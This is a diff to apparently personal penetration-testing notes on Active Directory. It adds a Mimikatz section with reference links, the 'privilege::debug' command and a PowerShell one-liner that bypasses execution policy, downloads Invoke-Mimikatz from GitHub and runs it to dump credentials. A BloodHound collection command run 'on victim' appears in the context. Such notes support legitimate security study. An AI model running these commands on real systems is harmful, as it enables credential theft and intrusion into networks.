@@ -88,8 +88,15 @@ on victim, transfer file then import into Bloodhound and run queries
     Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip        
     
 ## Mimikatz  
-
+[Mimikatz and Password Dumps Reference](https://ivanitlearning.wordpress.com/2019/09/07/mimikatz-and-password-dumps/) 
 [Online Password Cracker - Crackstation](https://crackstation.net/)   
+
+    privilege::debug
+    
+Powershell Script 
+
+    powershell.exe-exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
+
     
 # Resources
 [Understanding Windows Lateral Movement](https://attl4s.github.io/assets/pdf/Understanding_Windows_Lateral_Movements.pdf)  
